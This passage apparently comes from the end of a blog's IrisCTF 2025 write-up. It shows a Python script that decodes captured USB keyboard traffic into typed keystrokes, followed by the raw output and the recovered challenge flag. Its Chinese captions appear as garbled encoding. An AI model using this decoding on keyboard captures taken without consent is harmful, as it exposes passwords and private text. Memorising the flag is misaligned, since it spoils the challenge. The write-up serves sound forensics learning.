class="string">&quot;6&quot;</span>, <span class="string">&quot;24&quot;</span>: <span class="string">&quot;7&quot;</span>, <span class="string">&quot;25&quot;</span>: <span class="string">&quot;8&quot;</span>, <span class="string">&quot;26&quot;</span>: <span class="string">&quot;9&quot;</span>, <span class="string">&quot;27&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">              <span class="string">&quot;28&quot;</span>: <span class="string">&quot;&lt;RET&gt;&quot;</span>, <span class="string">&quot;29&quot;</span>: <span class="string">&quot;&lt;ESC&gt;&quot;</span>, <span class="string">&quot;2a&quot;</span>: <span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>: <span class="string">&quot;\t&quot;</span>, <span class="string">&quot;2c&quot;</span>: <span class="string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="string">&quot;2d&quot;</span>: <span class="string">&quot;-&quot;</span>, <span class="string">&quot;2e&quot;</span>: <span class="string">&quot;=&quot;</span>, <span class="string">&quot;2f&quot;</span>: <span class="string">&quot;[&quot;</span>,</span><br><span class="line">              <span class="string">&quot;30&quot;</span>: <span class="string">&quot;]&quot;</span>, <span class="string">&quot;31&quot;</span>: <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;32&quot;</span>: <span class="string">&quot;&lt;NON&gt;&quot;</span>, <span class="string">&quot;33&quot;</span>: <span class="string">&quot;;&quot;</span>, <span class="string">&quot;34&quot;</span>: <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;35&quot;</span>: <span class="string">&quot;&lt;GA&gt;&quot;</span>, <span class="string">&quot;36&quot;</span>: <span class="string">&quot;,&quot;</span>, <span class="string">&quot;37&quot;</span>: <span class="string">&quot;.&quot;</span>, <span class="string">&quot;38&quot;</span>: <span class="string">&quot;/&quot;</span>,</span><br><span class="line">              <span class="string">&quot;39&quot;</span>: <span class="string">&quot;&lt;CAP&gt;&quot;</span>, <span class="string">&quot;3a&quot;</span>: <span class="string">&quot;&lt;F1&gt;&quot;</span>, <span class="string">&quot;3b&quot;</span>: <span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>: <span class="string">&quot;&lt;F3&gt;&quot;</span>, <span class="string">&quot;3d&quot;</span>: <span class="string">&quot;&lt;F4&gt;&quot;</span>, <span class="string">&quot;3e&quot;</span>: <span class="string">&quot;&lt;F5&gt;&quot;</span>, <span class="string">&quot;3f&quot;</span>: <span class="string">&quot;&lt;F6&gt;&quot;</span>,</span><br><span class="line">              <span class="string">&quot;40&quot;</span>: <span class="string">&quot;&lt;F7&gt;&quot;</span>, <span class="string">&quot;41&quot;</span>: <span class="string">&quot;&lt;F8&gt;&quot;</span>, <span class="string">&quot;42&quot;</span>: <span class="string">&quot;&lt;F9&gt;&quot;</span>, <span class="string">&quot;43&quot;</span>: <span class="string">&quot;&lt;F10&gt;&quot;</span>, <span class="string">&quot;44&quot;</span>: <span class="string">&quot;&lt;F11&gt;&quot;</span>, <span class="string">&quot;45&quot;</span>: <span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">shiftKeys = &#123;<span class="string">&quot;04&quot;</span>: <span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>: <span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>: <span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>: <span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>: <span class="string">&quot;E&quot;</span>, <span class="string">&quot;09&quot;</span>: <span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>: <span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>: <span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>: <span class="string">&quot;I&quot;</span>,</span><br><span class="line">             <span class="string">&quot;0d&quot;</span>: <span class="string">&quot;J&quot;</span>, <span class="string">&quot;0e&quot;</span>: <span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>: <span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>: <span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>: <span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>: <span class="string">&quot;O&quot;</span>, <span class="string">&quot;13&quot;</span>: <span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>: <span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>: <span class="string">&quot;R&quot;</span>,</span><br><span class="line">             <span class="string">&quot;16&quot;</span>: <span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>: <span class="string">&quot;T&quot;</span>, <span class="string">&quot;18&quot;</span>: <span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>: <span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>: <span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>: <span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>: <span class="string">&quot;Y&quot;</span>, <span class="string">&quot;1d&quot;</span>: <span class="string">&quot;Z&quot;</span>, <span class="string">&quot;1e&quot;</span>: <span class="string">&quot;!&quot;</span>,</span><br><span class="line">             <span class="string">&quot;1f&quot;</span>: <span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>: <span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>: <span class="string">&quot;$&quot;</span>, <span class="string">&quot;22&quot;</span>: <span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>: <span class="string">&quot;^&quot;</span>, <span class="string">&quot;24&quot;</span>: <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;25&quot;</span>: <span class="string">&quot;*&quot;</span>, <span class="string">&quot;26&quot;</span>: <span class="string">&quot;(&quot;</span>, <span class="string">&quot;27&quot;</span>: <span class="string">&quot;)&quot;</span>,</span><br><span class="line">             <span class="string">&quot;28&quot;</span>: <span class="string">&quot;&lt;RET&gt;&quot;</span>, <span class="string">&quot;29&quot;</span>: <span class="string">&quot;&lt;ESC&gt;&quot;</span>, <span class="string">&quot;2a&quot;</span>: <span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>: <span class="string">&quot;\t&quot;</span>, <span class="string">&quot;2c&quot;</span>: <span class="string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="string">&quot;2d&quot;</span>: <span class="string">&quot;_&quot;</span>, <span class="string">&quot;2e&quot;</span>: <span class="string">&quot;+&quot;</span>, <span class="string">&quot;2f&quot;</span>: <span class="string">&quot;&#123;&quot;</span>,</span><br><span class="line">             <span class="string">&quot;30&quot;</span>: <span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;31&quot;</span>: <span class="string">&quot;|&quot;</span>, <span class="string">&quot;32&quot;</span>: <span class="string">&quot;&lt;NON&gt;&quot;</span>, <span class="string">&quot;33&quot;</span>: <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;34&quot;</span>: <span class="string">&quot;:&quot;</span>, <span class="string">&quot;35&quot;</span>: <span class="string">&quot;&lt;GA&gt;&quot;</span>, <span class="string">&quot;36&quot;</span>: <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;37&quot;</span>: <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;38&quot;</span>: <span class="string">&quot;?&quot;</span>,</span><br><span class="line">             <span class="string">&quot;39&quot;</span>: <span class="string">&quot;&lt;CAP&gt;&quot;</span>, <span class="string">&quot;3a&quot;</span>: <span class="string">&quot;&lt;F1&gt;&quot;</span>, <span class="string">&quot;3b&quot;</span>: <span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>: <span class="string">&quot;&lt;F3&gt;&quot;</span>, <span class="string">&quot;3d&quot;</span>: <span class="string">&quot;&lt;F4&gt;&quot;</span>, <span class="string">&quot;3e&quot;</span>: <span class="string">&quot;&lt;F5&gt;&quot;</span>, <span class="string">&quot;3f&quot;</span>: <span class="string">&quot;&lt;F6&gt;&quot;</span>,</span><br><span class="line">             <span class="string">&quot;40&quot;</span>: <span class="string">&quot;&lt;F7&gt;&quot;</span>, <span class="string">&quot;41&quot;</span>: <span class="string">&quot;&lt;F8&gt;&quot;</span>, <span class="string">&quot;42&quot;</span>: <span class="string">&quot;&lt;F9&gt;&quot;</span>, <span class="string">&quot;43&quot;</span>: <span class="string">&quot;&lt;F10&gt;&quot;</span>, <span class="string">&quot;44&quot;</span>: <span class="string">&quot;&lt;F11&gt;&quot;</span>, <span class="string">&quot;45&quot;</span>: <span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;usb.data&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="comment"># print(line)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(line) != <span class="number">17</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    nums.append(line[<span class="number">0</span>:<span class="number">2</span>] + line[<span class="number">4</span>:<span class="number">6</span>])</span><br><span class="line">    <span class="comment"># print(nums)</span></span><br><span class="line">keys.close()</span><br><span class="line">output = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="keyword">if</span> n[<span class="number">2</span>:<span class="number">4</span>] == <span class="string">&quot;00&quot;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> n[<span class="number">2</span>:<span class="number">4</span>] <span class="keyword">in</span> normalKeys:</span><br><span class="line">        <span class="keyword">if</span> n[<span class="number">0</span>:<span class="number">2</span>] == <span class="string">&quot;02&quot;</span>:</span><br><span class="line">            output += shiftKeys[n[<span class="number">2</span>:<span class="number">4</span>]]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output += normalKeys[n[<span class="number">2</span>:<span class="number">4</span>]]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">&#x27;[unknown]&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;output :&#x27;</span> + output)</span><br></pre></td></tr></table></figure>
<p>è¼¸å‡ºçµæœ(ç¯€éŒ„)ï¼š<br><code>output :Hheey&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;AAali&lt;DEL&gt;&lt;DEL&gt;licce!&lt;SPACE&gt;Ii&lt;SPACE&gt;&lt;SPACE&gt;tthink&lt;SPACE&gt;&lt;SPACE&gt;Ii&#39;&#39;m&lt;SPACE&gt;&lt;SPACE&gt;ssupo&lt;DEL&gt;ppooseed&lt;SPACE&gt;&lt;SPACE&gt;too&lt;SPACE&gt;&lt;SPACE&gt;giivee&lt;SPACE&gt;yoou&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;tiss&lt;SPACE&gt;fllaag&quot;&lt;RET&gt;&lt;RET&gt;iriisctfF&#123;[tthis_ajjd&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;keyloggeer_iisS_boo&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;too_hard_two&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;too&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;to_use&#125;&lt;RET&gt;g[unknown]a[unknown]</code></p>
<p>æ‰‹å‹•æ”¹ä¸€ä¸‹ï¼Œå°±å¾—åˆ°ï¼š<code>irisctf&#123;this_keylogger_is_too_hard_to_use&#125;</code>  </p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRYPTO"><span class="toc-number">2.</span> <span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#KittyCrypt"><span class="toc-number">2.1.</span> <span class="toc-text">KittyCrypt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#knutsacque"><span class="toc-number">2.2.</span> <span class="toc-text">knutsacque</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">3.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Cobra%E2%80%99s-Den"><span class="toc-number">3.1.</span> <span class="toc-text">Cobraâ€™s Den</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FORENS"><span class="toc-number">4.</span> <span class="toc-text">FORENS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#deldeldel"><span class="toc-number">4.1.</span> <span class="toc-text">deldeldel</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2025/01/06/irisctf-2025/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2025/01/06/irisctf-2025/&text=IrisCTF 2025 Write Up"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2025/01/06/irisctf-2025/&title=IrisCTF 2025 Write Up"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2025/01/06/irisctf-2025/&is_video=false&description=IrisCTF 2025 Write Up"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=IrisCTF 2025 Write Up&body=Check out this article: http://wha13.github.io/2025/01/06/irisctf-2025/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2025/01/06/irisctf-2025/&title=IrisCTF 2025 Write Up"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2025/01/06/irisctf-2025/&title=IrisCTF 2025 Write Up"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2025/01/06/irisctf-2025/&title=IrisCTF 2025 Write Up"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2025/01/06/irisctf-2025/&title=IrisCTF 2025 Write Up"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2025/01/06/irisctf-2025/&name=IrisCTF 2025 Write Up&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2025/01/06/irisctf-2025/&t=IrisCTF 2025 Write Up"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2025
    William Lin
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
